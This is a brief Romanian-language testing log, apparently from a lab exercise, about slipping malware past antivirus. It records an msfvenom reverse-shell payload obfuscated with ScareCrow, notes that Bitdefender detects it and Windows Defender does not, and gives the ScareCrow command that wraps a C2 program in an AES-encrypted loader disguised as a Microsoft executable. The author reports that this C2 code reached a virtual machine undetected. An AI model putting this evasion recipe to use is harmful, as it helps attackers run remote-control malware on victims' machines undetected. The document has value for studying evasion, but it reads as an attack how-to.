# Testing:
Powershell in executabil pentru a downloada si executa un cod raw de pe server: fail
Crearea unui payload folosind msfvenom(reverse-shell) si obfuscarea folosind ScareCrow: Bitdefender recunoaste, Windows Defender nu, aplicatia poate rula

# ScareCrow:


# Crearea environmentului C#:
Compilator de C#:
sudo apt install mono-complete

The fun stuff:
./ScareCrow -I bypasser.cs -domain www.microsoft.com -encryptionmode AES
Pentru un binary, numit "bypasser.cs", il injecteaza folosind un executabil care arata ca un executabil Microsoft, criptand codul prin metoda de criptare AES

In cazul meu, bypasser.cs este codul din C2, Program.cs, care a ajung pe masina virtuala fara probleme
